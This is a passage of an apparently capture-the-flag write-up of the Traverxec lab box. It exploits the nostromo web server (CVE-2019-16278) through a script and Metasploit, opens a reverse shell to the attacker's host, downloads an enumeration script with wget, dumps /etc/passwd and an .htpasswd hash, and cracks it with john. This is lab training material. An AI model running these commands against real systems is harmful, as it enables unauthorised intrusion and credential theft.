<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ python cve2019_16278.py <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span> <span class="number">80</span> whoami</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                        _____-<span class="number">2019</span>-<span class="number">16278</span></span><br><span class="line">        _____  _______    ______   _____\    \   </span><br><span class="line">   _____\    \_\      |  |      | /    / |    |  </span><br><span class="line">  /     /|     ||     /  /     /|/    /  /___/|  </span><br><span class="line"> /     / /____/||\    \  \    |/|    |__ |___|/  </span><br><span class="line">|     | |____|/ \ \    \ |    | |       \        </span><br><span class="line">|     |  _____   \|     \|    | |     __/ __     </span><br><span class="line">|\     \|\    \   |\         /| |\    \  /  \    </span><br><span class="line">| \_____\|    |   | \_______/ | | \____\/    |   </span><br><span class="line">| |     /____/|    \ |     | /  | |    |____/|   </span><br><span class="line"> \|_____|    ||     \|_____|/    \|____|   | |   </span><br><span class="line">        |____|/                        |___|/    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Fri, <span class="number">9</span> Apr <span class="number">2020</span> <span class="number">22</span>:<span class="number">18</span>:<span class="number">22</span> GMT</span><br><span class="line">Server: nostromo <span class="number">1.9</span><span class="number">.6</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www-data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>as you can see It give me results ‚Äì <code>www-data</code>. next I try the <code>hostname</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python 3</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ python cve2019_16278.py <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span> <span class="number">80</span> hostname</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                        _____-<span class="number">2019</span>-<span class="number">16278</span></span><br><span class="line">        _____  _______    ______   _____\    \   </span><br><span class="line">   _____\    \_\      |  |      | /    / |    |  </span><br><span class="line">  /     /|     ||     /  /     /|/    /  /___/|  </span><br><span class="line"> /     / /____/||\    \  \    |/|    |__ |___|/  </span><br><span class="line">|     | |____|/ \ \    \ |    | |       \        </span><br><span class="line">|     |  _____   \|     \|    | |     __/ __     </span><br><span class="line">|\     \|\    \   |\         /| |\    \  /  \    </span><br><span class="line">| \_____\|    |   | \_______/ | | \____\/    |   </span><br><span class="line">| |     /____/|    \ |     | /  | |    |____/|   </span><br><span class="line"> \|_____|    ||     \|_____|/    \|____|   | |   </span><br><span class="line">        |____|/                        |___|/    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Fri, <span class="number">9</span> Apr <span class="number">2020</span> <span class="number">22</span>:<span class="number">19</span>:<span class="number">45</span> GMT</span><br><span class="line">Server: nostromo <span class="number">1.9</span><span class="number">.6</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">traverxec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>and It gives me result hostname ‚Äì <code>traverxec</code>. Now since I can execute a command i‚Äôll try to use <code>netcat</code> if i can gain reverse shell, but it‚Äôs not working it gives me an error <code>Cmd line: wrong</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python 3</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ python cve2019_16278.py <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span> <span class="number">80</span> nc <span class="number">10.10</span><span class="number">.15</span><span class="number">.21</span> <span class="number">1339</span> -e /<span class="built_in">bin</span>/bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                        _____-<span class="number">2019</span>-<span class="number">16278</span></span><br><span class="line">        _____  _______    ______   _____\    \   </span><br><span class="line">   _____\    \_\      |  |      | /    / |    |  </span><br><span class="line">  /     /|     ||     /  /     /|/    /  /___/|  </span><br><span class="line"> /     / /____/||\    \  \    |/|    |__ |___|/  </span><br><span class="line">|     | |____|/ \ \    \ |    | |       \        </span><br><span class="line">|     |  _____   \|     \|    | |     __/ __     </span><br><span class="line">|\     \|\    \   |\         /| |\    \  /  \    </span><br><span class="line">| \_____\|    |   | \_______/ | | \____\/    |   </span><br><span class="line">| |     /____/|    \ |     | /  | |    |____/|   </span><br><span class="line"> \|_____|    ||     \|_____|/    \|____|   | |   </span><br><span class="line">        |____|/                        |___|/    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Fri, <span class="number">10</span> Apr <span class="number">2020</span> <span class="number">22</span>:<span class="number">21</span>:<span class="number">52</span> GMT</span><br><span class="line">Server: nostromo <span class="number">1.9</span><span class="number">.6</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Cmd line: wrong</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Use-Metasploit-to-Direct-Access"><a href="#Use-Metasploit-to-Direct-Access" class="headerlink" title="Use Metasploit to Direct Access"></a>Use Metasploit to Direct Access</h3><p>So I try <a target="_blank" rel="noopener" href="https://www.metasploit.com/">Rapi7 - MetaSploit</a> to direct access in the target machine and obtain remote shell, I search about <code>Nostromo exploit</code> and it is very exact what I needed so :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ msfconsole</span><br><span class="line">                                                  </span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%</span><br><span class="line">%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%</span><br><span class="line">%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%</span><br><span class="line">%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%</span><br><span class="line">%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v5<span class="number">.0</span><span class="number">.80</span>-dev                          ]</span><br><span class="line">+ -- --=[ <span class="number">1983</span> exploits - <span class="number">1085</span> auxiliary - <span class="number">339</span> post       ]</span><br><span class="line">+ -- --=[ <span class="number">563</span> payloads - <span class="number">45</span> encoders - <span class="number">10</span> nops            ]</span><br><span class="line">+ -- --=[ <span class="number">7</span> evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Writing a custom module? After editing your module, why <span class="keyword">not</span> <span class="keyword">try</span> the reload command</span><br><span class="line"></span><br><span class="line">msf5 &gt; search nostromo</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                   Disclosure Date  Rank  Check  Description</span></span><br><span class="line">   -  ----                                   ---------------  ----  -----  -----------</span><br><span class="line">   <span class="number">0</span>  exploit/multi/http/nostromo_code_exec  <span class="number">2019</span>-<span class="number">10</span>-<span class="number">20</span>       good  Yes    Nostromo Directory Traversal Remote Command Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>Now i will use it but first we need to see the options so I can see what is the requirements :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/multi/http/nostromo_code_exec</span><br><span class="line">msf5 exploit(multi/http/nostromo_code_exec) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/nostromo_code_exec):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   Proxies                   no        A proxy chain of <span class="built_in">format</span> <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                    yes       The target host(s), <span class="built_in">range</span> CIDR identifier, <span class="keyword">or</span> hosts file <span class="keyword">with</span> syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT    <span class="number">80</span>               yes       The target port (TCP)</span><br><span class="line">   SRVHOST  <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>          yes       The local host to listen on. This must be an address on the local machine <span class="keyword">or</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">   SRVPORT  <span class="number">8080</span>             yes       The local port to listen on.</span><br><span class="line">   SSL      false            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default <span class="keyword">is</span> randomly generated)</span><br><span class="line">   URIPATH                   no        The URI to use <span class="keyword">for</span> this exploit (default <span class="keyword">is</span> random)</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  <span class="number">4444</span>             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Automatic (Unix In-Memory)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/http/nostromo_code_exec) &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Get-in-into-the-machine"><a href="#Get-in-into-the-machine" class="headerlink" title="Get in into the machine"></a>Get in into the machine</h3><p>So <code>RHOSTS</code> or the target host which is the <em>Traverxec</em> and <code>LHOST</code> or the <em>attackers</em> IP (me) that I will input and do the exploitation.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/http/nostromo_code_exec) &gt; <span class="built_in">set</span> RHOSTS <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span></span><br><span class="line">RHOSTS =&gt; <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span></span><br><span class="line">msf5 exploit(multi/http/nostromo_code_exec) &gt; <span class="built_in">set</span> LHOST <span class="number">10.10</span><span class="number">.15</span><span class="number">.21</span></span><br><span class="line">LHOST =&gt; <span class="number">10.10</span><span class="number">.15</span><span class="number">.21</span></span><br><span class="line">msf5 exploit(multi/http/nostromo_code_exec) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">10.10</span><span class="number">.15</span><span class="number">.21</span>:<span class="number">4444</span> </span><br><span class="line">[*] Configuring Automatic (Unix In-Memory) target</span><br><span class="line">[*] Sending cmd/unix/reverse_perl command payload</span><br><span class="line">[*] Command shell session <span class="number">1</span> opened (<span class="number">10.10</span><span class="number">.15</span><span class="number">.21</span>:<span class="number">4444</span> -&gt; <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span>:<span class="number">51530</span>) at <span class="number">2020</span>-04-<span class="number">11</span> 06:<span class="number">45</span>:<span class="number">16</span> +0800</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>so I have now direct access to machine. but I need to upgrade it into interactive shell with <em>python</em> :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Finally I have now the <code>www-data</code> :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/usr/<span class="built_in">bin</span>$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">www-data@traverxec:/usr/<span class="built_in">bin</span>$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="WWW-DATA"><a href="#WWW-DATA" class="headerlink" title="WWW-DATA"></a>WWW-DATA</h3><p>Now that i‚Äôm in, the enumeration start again‚Äô to do this quickly I use <a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">LinEnum.sh</a> this script is very useful if the attacker is trying to look what they need to do exploit exploit or use some stuffs for privilege escalation so from my Kali Linux machine I‚Äôll transfer <code>LinEnum.sh</code> in <code>/tmp</code> folder and run it.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/tmp$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">systemd-private-587b5e2d5cd0457081bf5a03c6d18e2a-systemd-timesyncd.service-TqSk1v</span><br><span class="line">vmware-root</span><br><span class="line">vmware-root_557-4282236562</span><br><span class="line">www-data@traverxec:/tmp$ wget http://10.10.15.21/LinEnum.sh</span><br><span class="line">wget http://10.10.15.21/LinEnum.sh</span><br><span class="line">--2020-04-10 19:02:22--  http://10.10.15.21/LinEnum.sh</span><br><span class="line">Connecting to 10.10.15.21:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 46631 (46K) [text/x-sh]</span><br><span class="line">Saving to: <span class="string">&#x27;LinEnum.sh&#x27;</span></span><br><span class="line"></span><br><span class="line">LinEnum.sh          100%[===================&gt;]  45.54K  59.0KB/s    <span class="keyword">in</span> 0.8s    </span><br><span class="line"></span><br><span class="line">2020-04-10 19:02:24 (59.0 KB/s) - <span class="string">&#x27;LinEnum.sh&#x27;</span> saved [46631/46631]</span><br><span class="line"></span><br><span class="line">www-data@traverxec:/tmp$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">LinEnum.sh</span><br><span class="line">linux-exploit-suggester.sh</span><br><span class="line">systemd-private-587b5e2d5cd0457081bf5a03c6d18e2a-systemd-timesyncd.service-TqSk1v</span><br><span class="line">vmware-root</span><br><span class="line">vmware-root_557-4282236562</span><br><span class="line">www-data@traverxec:/tmp$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>And ofcourse running this it will give us a basic information about the target :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/tmp$ bash LinEnum.sh</span><br><span class="line">bash LinEnum.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"><span class="comment"># Local Linux Enumeration &amp; Privilege Escalation Script #</span></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"><span class="comment"># www.rebootuser.com</span></span><br><span class="line"><span class="comment"># version 0.982</span></span><br><span class="line"></span><br><span class="line">[-] Debug Info</span><br><span class="line">[+] Thorough tests = Disabled</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Scan started at:</span><br><span class="line">Fri Apr 10 19:03:30 EDT 2020</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### SYSTEM ##############################################</span></span><br><span class="line">[-] Kernel information:</span><br><span class="line">Linux traverxec 4.19.0-6-amd64 <span class="comment">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] Kernel information (continued):</span><br><span class="line">Linux version 4.19.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) <span class="comment">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] Specific release information:</span><br><span class="line">PRETTY_NAME=<span class="string">&quot;Debian GNU/Linux 10 (buster)&quot;</span></span><br><span class="line">NAME=<span class="string">&quot;Debian GNU/Linux&quot;</span></span><br><span class="line">VERSION_ID=<span class="string">&quot;10&quot;</span></span><br><span class="line">VERSION=<span class="string">&quot;10 (buster)&quot;</span></span><br><span class="line">VERSION_CODENAME=buster</span><br><span class="line">ID=debian</span><br><span class="line">HOME_URL=<span class="string">&quot;https://www.debian.org/&quot;</span></span><br><span class="line">SUPPORT_URL=<span class="string">&quot;https://www.debian.org/support&quot;</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">&quot;https://bugs.debian.org/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] Hostname:</span><br><span class="line">traverxec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### USER/GROUP ##########################################</span></span><br><span class="line">[-] Current user/group info:</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>and there‚Äôs a previously login and that will be our user named ‚Äì <code>david</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">[-] Users that have previously logged onto the system:</span><br><span class="line">Username         Port     From             Latest</span><br><span class="line">root             tty1                      Sat Nov 16 16:07:31 -0500 2019</span><br><span class="line">david            pts/4    10.10.15.162     Fri Apr 09 18:59:23 -0400 2020</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>I can also see what‚Äôs the user password in <code>/etc/passwd</code> based on <code>david:x:1000:1000:david,,,:/home/david:/bin/bash </code> :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">[-] Contents of /etc/passwd:</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">david:x:1000:1000:david,,,:/home/david:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>but the script is doing that for me ;)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">[-] htpasswd found - could contain passwords:</span><br><span class="line">/var/nostromo/conf/.htpasswd</span><br><span class="line">david:$1$e7NfNpNi<span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Now that I have a password hash for <em>david</em> I use john decrypt it with <code>rockyou.txt</code> wordlists. and I got the password <code>Nowonly4me</code></p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ john david --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Warning: detected hash type <span class="string">&quot;md5crypt&quot;</span>, but the <span class="built_in">string</span> <span class="keyword">is</span> also recognized <span class="keyword">as</span> <span class="string">&quot;md5crypt-long&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=md5crypt-long&quot;</span> option to force loading these <span class="keyword">as</span> that type instead</span><br><span class="line">Using <span class="literal">default</span> input encoding: UTF<span class="number">-8</span></span><br><span class="line">Loaded <span class="number">1</span> <span class="function">password <span class="title">hash</span> (<span class="params">md5crypt, crypt(<span class="number">3</span></span>) $1$ (<span class="params"><span class="keyword">and</span> variants</span>) [MD5 256/256 AVX2 8x3])</span></span><br><span class="line"><span class="function">Will run 4 OpenMP threads</span></span><br><span class="line"><span class="function">Press &#x27;q&#x27; <span class="keyword">or</span> Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span></span><br><span class="line"><span class="function"><span class="title">Nowonly4me</span>       (<span class="params">david</span>)</span></span><br><span class="line"><span class="function">1g 0:00:05:49 <span class="title">DONE</span> (<span class="params"><span class="number">2020</span><span class="number">-04</span><span class="number">-11</span> <span class="number">07</span>:<span class="number">12</span></span>) 0.002864g/s 30305p/s 30305c/s 30305C/s Noyoudo..Nous4</span>=<span class="number">5</span></span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> took <span class="number">5</span>m49s </span><br><span class="line">‚ùØ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>I try to login into SSH with I password I got but it seems is not the right password. It just a rabbit hole. so moved on try to look again with other stuffs. so I‚Äôll go at home directory it doesn‚Äôt allow me to look into files.</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/usr/bin$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">www-data@traverxec:/home$ ls</span><br><span class="line">ls</span><br><span class="line">david</span><br><span class="line">www-data@traverxec:/home$ cd david</span><br><span class="line">cd david</span><br><span class="line">www-data@traverxec:/home/david$ ls</span><br><span class="line">ls</span><br><span class="line">ls: cannot open directory <span class="string">&#x27;.&#x27;</span>: Permission denied</span><br><span class="line">www-data@traverxec:/home/david$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>So I‚Äôll try to look more on the machine folder‚Äô I go first at <code>/var/</code> directory and I see a <em><code>nostromo</code></em> which is very interesting.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/home/david$ <span class="built_in">cd</span> /var</span><br><span class="line"><span class="built_in">cd</span> /var</span><br><span class="line">www-data@traverxec:/var$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">backups  cache  lib  <span class="built_in">local</span>  lock  <span class="built_in">log</span>  mail  nostromo  opt  run  spool  tmp</span><br><span class="line">www-data@traverxec:/var$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Looking at the nostromo folder there was a <code>configuration file</code> which is the <code>nhttpd.conf</code> and this will give me a big hint what to do next.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/var/nostromo$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">conf  htdocs  icons  logs</span><br><span class="line">www-data@traverxec:/var/nostromo$ file conf</span><br><span class="line">file conf</span><br><span class="line">conf: directory</span><br><span class="line">www-data@traverxec:/var/nostromo$ <span class="built_in">cd</span> conf</span><br><span class="line"><span class="built_in">cd</span> conf</span><br><span class="line">www-data@traverxec:/var/nostromo/conf$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">mimes  nhttpd.conf</span><br><span class="line">www-data@traverxec:/var/nostromo/conf$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The <code>nhttpd.conf</code> has given instructions :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/var/nostromo/conf$ <span class="built_in">cat</span> nhttpd.conf</span><br><span class="line"><span class="built_in">cat</span> nhttpd.conf</span><br><span class="line"><span class="comment"># MAIN [MANDATORY]</span></span><br><span class="line"></span><br><span class="line">servername              traverxec.htb</span><br><span class="line">serverlisten            *</span><br><span class="line">serveradmin             david@traverxec.htb</span><br><span class="line">serverroot              /var/nostromo</span><br><span class="line">servermimes             conf/mimes</span><br><span class="line">docroot                 /var/nostromo/htdocs</span><br><span class="line">docindex                index.html</span><br><span class="line"></span><br><span class="line"><span class="comment"># LOGS [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">logpid                  logs/nhttpd.pid</span><br><span class="line"></span><br><span class="line"><span class="comment"># SETUID [RECOMMENDED]</span></span><br><span class="line"></span><br><span class="line">user                    www-data</span><br><span class="line"></span><br><span class="line"><span class="comment"># BASIC AUTHENTICATION [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">htaccess                .htaccess</span><br><span class="line">htpasswd                /var/nostromo/conf/.htpasswd</span><br><span class="line"></span><br><span class="line"><span class="comment"># ALIASES 